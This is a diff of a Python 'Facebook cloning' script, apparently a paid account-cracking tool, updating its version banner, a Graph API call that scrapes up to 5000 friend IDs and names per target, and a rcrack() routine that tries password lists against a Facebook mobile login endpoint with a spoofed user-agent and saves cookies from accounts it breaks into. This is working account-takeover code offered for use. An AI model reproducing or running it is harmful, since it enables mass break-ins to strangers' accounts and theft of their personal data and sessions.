@@ -117,7 +117,7 @@ logo=("""\033[1;32m
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m2.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m3.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
 --------------------------------------------------
 \033[1;37m[-]KINGX MR SW4T1
@@ -211,7 +211,7 @@ def public():
 	linex()
 	for userr in usrr:
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			col = ses.get('https://graph.facebook.com/v3.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -858,8 +858,8 @@ def rcrack(ids,passlist):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-M105M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36',}
+			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -912,7 +912,7 @@ def menu_apikey():
 {+}\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
 (+}\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
-{+}\033[1;32mVERSION        :\033[1;32m2.0\033[1;32m
+{+}\033[1;32mVERSION        :\033[1;32m3.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32mPAID\033[1;32m
 --------------------------------------------------
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
